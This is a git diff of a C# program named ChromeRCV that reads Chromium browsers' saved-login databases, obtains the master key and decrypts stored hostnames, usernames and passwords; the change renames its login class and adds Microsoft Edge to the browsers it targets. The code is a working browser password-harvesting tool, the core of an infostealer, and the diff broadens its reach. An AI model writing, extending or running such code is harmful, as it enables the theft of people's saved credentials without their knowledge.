@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Linq;
 using System.Text;
 using System.Collections.Generic;
@@ -8,7 +8,7 @@ using System.Security.Cryptography;
 
 namespace ChromeRCV
 {
-    internal sealed class ChromeLogin
+    internal sealed class ChromiumLogin
     {
         string _hostname;
         string _username;
@@ -35,7 +35,7 @@ namespace ChromeRCV
             }
         }
 
-        public ChromeLogin(string hostname, string username, string password)
+        public ChromiumLogin(string hostname, string username, string password)
         {
             _hostname = hostname;
             _username = username;
@@ -47,7 +47,7 @@ namespace ChromeRCV
             return string.Format("{0} - {1} - {2}", _hostname, _username, _password);
         }
     }
-    
+
     class Program
     {
         private static string LocalAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
@@ -55,7 +55,8 @@ namespace ChromeRCV
         private static List<string> Browsers = new List<string>
         {
             LocalAppdata + "\\Google\\Chrome",
-            LocalAppdata + "\\Google(x86)\\Chrome"
+            LocalAppdata + "\\Google(x86)\\Chrome",
+            LocalAppdata + "\\Microsoft\\Edge"
         };
 
         public static byte[] GetMasterKey(string directory)
@@ -109,7 +110,7 @@ namespace ChromeRCV
             }
         }
 
-        public static bool GetChromiumLogins(string loginDataPath, byte[] key, ref List<ChromeLogin> logins)
+        public static bool GetChromiumLogins(string loginDataPath, byte[] key, ref List<ChromiumLogin> logins)
         {
             using (SQLiteConnection conn = new SQLiteConnection("Data Source=" + loginDataPath + ";Version=3;New=True;Compress=True;")) {
                 conn.Open();
@@ -126,7 +127,7 @@ namespace ChromeRCV
                             if (string.IsNullOrEmpty(password))
                                 break;
 
-                            logins.Add(new ChromeLogin(hostname, username, DecryptPassword(password, key)));
+                            logins.Add(new ChromiumLogin(hostname, username, DecryptPassword(password, key)));
                         }
                     }
                 }
@@ -137,7 +138,7 @@ namespace ChromeRCV
 
         static void Main(string[] args)
         {
-            List<ChromeLogin> logins = new List<ChromeLogin>();
+            List<ChromiumLogin> logins = new List<ChromiumLogin>();
 
             foreach(string browserPath in Browsers) {
                 if(Directory.Exists(browserPath)) {
